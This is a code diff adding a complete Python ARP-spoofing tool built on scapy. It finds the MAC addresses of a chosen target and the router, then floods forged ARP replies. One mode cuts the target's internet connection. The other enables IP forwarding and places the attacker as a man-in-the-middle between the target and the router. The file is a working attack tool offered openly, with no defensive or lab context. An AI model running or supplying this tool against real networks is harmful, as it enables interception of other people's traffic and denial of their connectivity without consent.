@@ -1,0 +1,72 @@
+#!/usr/bin/env python3
+from scapy.all import ARP, Ether, srp, send
+from termcolor import colored
+from dataclasses import dataclass
+from os import system, geteuid
+from threading import Thread
+from argparse import ArgumentParser
+
+class ExitCodes():
+    SUCCESS = 0
+    PERMISSIONERROR = 1
+
+@dataclass
+class Client():
+    ip:str
+    mac:str
+
+    @staticmethod
+    def findMac(ip:str):
+        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+        return srp(packet, timeout=2, verbose=False)[0][0][1].hwsrc
+    
+    def __str__(self):
+        return f"{self.ip}:{self.mac}"
+
+class MITM():
+    def __init__(self, args:dict) -> None:
+        self.__dict__.update(args)
+        self.target = Client(self.target, Client.findMac(self.target))
+        self.router = Client(self.router, Client.findMac(self.router))
+    
+    def _spoof(self):
+        if self.block:
+            while True:
+                p = ARP(pdst=self.target.ip, psrc=self.router.ip, hwdst=self.target.mac, op=2)
+                send(p, verbose=False)
+        else:
+            system("sudo echo 1 >> /proc/sys/net/ipv4/ip_forward")
+            while True:
+                p = ARP(pdst=self.target.ip, psrc=self.router.ip, hwdst=self.target.mac, op=2)
+                p1 = ARP(pdst=self.router.ip, psrc=self.target.ip, hwdst=self.router.mac, op=2)
+                send(p, verbose=False)
+                send(p1, verbose=False)
+
+    def __call__(self):
+        t = Thread(target=self._spoof)
+        t.daemon = True
+        t.start()
+        input(colored("Enter to kill >> ", "red"))
+        system("sudo echo 0 >> /proc/sys/net/ipv4/ip_forward")
+
+def isSudo():
+    return geteuid() == 0
+
+def getArgs():
+    parser = ArgumentParser("netb", description="Arp Spoofing | SUDO IS REQUIRED")
+    parser.add_argument("router", type=str, help="Specify the router IPv4")
+    parser.add_argument("target", type=str, help="Specify the target IPv4")
+    parser.add_argument("-b", "--block", default=False, action="store_true", help="Specify if you want to block the internet connection of your target")
+    return parser.parse_args().__dict__
+
+def main()->int:
+    args = getArgs()
+    if not isSudo():
+        print(colored("sudo is required!", "red"))
+        return ExitCodes.PERMISSIONERROR
+    mitm = MITM(args)
+    mitm()
+    return ExitCodes.SUCCESS
+
+if __name__ == '__main__':
+    exit(main())
